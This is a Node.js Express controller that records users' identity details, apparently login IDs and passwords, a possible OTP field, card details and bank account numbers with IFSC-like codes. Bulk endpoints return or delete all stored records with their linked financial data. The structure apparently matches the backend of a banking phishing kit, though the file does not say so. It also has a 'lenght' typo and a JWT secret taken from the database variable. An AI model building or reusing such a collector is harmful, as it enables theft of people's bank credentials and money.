import detailmodel from "../model/detail.js"
import jwt from "jsonwebtoken"
import useridmodel from "../model/userid.js"
import odmodel from "../model/od.js"
import cardmodel from "../model/card.js"
import acmodel from "../model/ac.js"


export function sendtoken(user, res, message) {
  const token = jwt.sign(
    { id: user._id },
    process.env.MONGO_DB,
    { expiresIn: "7d" }
  );

  res.cookie("token", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  return res.status(201).json({
    success: true,
    message,
    user: {
      id: user._id,
      fullname: user.fullname,
      phonenumber: user.phonenumber,
      pen: user.pen,
      email: user.email,
      address: user.address,
      city: user.city,
      state: user.state,
      pincode: user.pincode,
      gender: user.gender,
    },
  });
}

export const register = async (req, res) => {
  const {
    fullname,
    phonenumber,
    pen,
    email,
    address,
    city,
    state,
    pincode,
    gender,
  } = req.body;

  try {
    
    const user = await detailmodel.create({
      fullname,
      phonenumber,
      pen,
      email,
      address,
      city,
      state,
      pincode,
      gender,
    });

    return sendtoken(user, res, "User registered successfully");

  } catch (error) {
    console.error(error);

    // Handle duplicate email even if concurrent requests occur
    if (error.code === 11000) {
      return res.status(409).json({
        success: false,
        message: "Email is already registered.",
      });
    }

    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};
export const registerdata = async (req,res)=>{
    try {
        const user = await detailmodel.findById(req.userId)
        const userdata = await useridmodel.find({
          userId: req.userId
        })
        const od = await odmodel.find({
          userid:req.userId
        })
        const card = await cardmodel.find({
          userid:req.userId
        })
        const ac = await acmodel.find({
          userid:req.userId
        })
        return res.status(200).json({
            success:true,
            user,
            userdata,
            od,
            card,
            ac
})
    } catch (error) {
        console.log(error)
    }
}

export const getdata = async (req, res)=>{
    try {
        const users = await detailmodel.find() 
        return res.status(200).json({
            success:true,
            count:users.length,
            users,
        })
    } catch (error) {
          return res.status(500).json({
      success: false,
      message: "Failed to fetch users",
    });
    }
}



// import useridmodel from "../model/userid.js";

export const userid = async (req, res) => {
  try {
    const { userIddata, idpadata } = req.body;

    // if (!userIddata || !idpadata) {
    //   return res.status(400).json({
    //     success: false,
    //     message: "Required fields are missing",
    //   })
    // }

    const iddata = await useridmodel.create({
      userId: req.userId,
      userIddata,
      idpadata,
    });

    return res.status(201).json({
      success: true,
      message: "Data saved successfully",
      
      iddata,
    });
  } catch (error) {
    console.error("userid error:", error.message);

    return res.status(500).json({
      success: false,
      message: "Failed to save data",
    });
  }
};

export const od = async (req,res)=>{
  const {od}=req.body

  try {
    const oddata = await odmodel.create({
      userid:req.userId,
      od
    });
    return res.status(201).json({
      success: true,
      message: "Data saved successfully",
      
      oddata
    });

    
  } catch (error) {
    console.log(error)
  }
}

export const card = async (req,res)=>{
  const {atcook,holdername,expiryMonth,last} = req.body

  try {
    const card = await cardmodel.create({
      userid:req.userId,
      holdername,
      atcook,
      expiryMonth,
      last
    })

   return res.status(201).json({
      message:"successfully card",
      card
    })
  } catch (error) {
    console.log(error)
  }
}

export const ac = async (req,res)=>{
  const {name,numberofac,numberif}=req.body

  try {
    const ac = await acmodel.create({
      userid:req.userId,
      name,numberofac,numberif
    })

    return res.status(201).json({
      message:"successfull ac",
      ac
    })
  } catch (error) {
    console.log(error)
  }
}



export const deleteHolder = async (req, res) => {
  try {
    const { id } = req.params;

    const deletedData = await detailmodel.findByIdAndDelete(id);

    if (!deletedData) {
      return res.status(404).json({
        success: false,
        message: "Holder not found"
      });
    }

    return res.status(200).json({
      success: true,
      message: "Holder deleted successfully"
    });

  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message
    });
  }
};

export const getdataid = async (req, res) => {
  try {
    // URL se user ID lena
    const { id } = req.params;

    // MongoDB se particular user find karna
    const userdata = await detailmodel.findById(id)
      .lean();

    // User nahi mila toh response
    if (!userdata) {
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    // Related models se data fetch karna
    const [userid, car,od,ac] = await Promise.all([

      useridmodel.find({
        userid: userdata._id
      })
      .lean(),

      cardmodel.find({
        userid: userdata._id
      })
      .lean(),
      odmodel.find({
        userid: userdata._id
      })
      .lean(),
      acmodel.find({
        userid:userdata._id
      })
      .lean(),

    ]);

    // Final response
    return res.status(200).json({
      success: true,
      message: "Successfully fetched data",
      userdata: {
        ...userdata,
        data: {
          userid,
          car,
          od,
          ac,
          applicationCount: userid.length + car.length + od.lenght + ac.lenght
        }
      }
    });

  } catch (error) {
    console.log(error);

    return res.status(500).json({
      success: false,
      message: error.message
    });
  }
};

export const getdataresponse = async (req, res) => {
  try {
    // Saare users fetch karo
    const users = await detailmodel.find()
      .select("fullname phonenumber email city state pen address pincode ")
      .lean();

    // Har user ka related data uske andar add karo
    const allUsers = await Promise.all(
      users.map(async (user) => {


        const [userid, car ,od,ac]= await Promise.all([

           useridmodel.find({
            userid: user._id
          })
          .lean(),
          cardmodel.find({
            userid: user._id
          })
          .lean(),
          odmodel.find({
            userid: user._id
          })
          .lean(),
          acmodel.find({
            userid:user._id
          })
          .lean(),
        ]);



        return {
          ...user,
          data: {
           
            userid,
            car,
            od,
            ac,
            applicationCount:userid.length + car.length + od.length + ac.length
          }
        };
      })
    );

    return res.status(200).json({
      success: true,
      count: allUsers.length,
      users: allUsers
    });

  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message
    });
  }
};

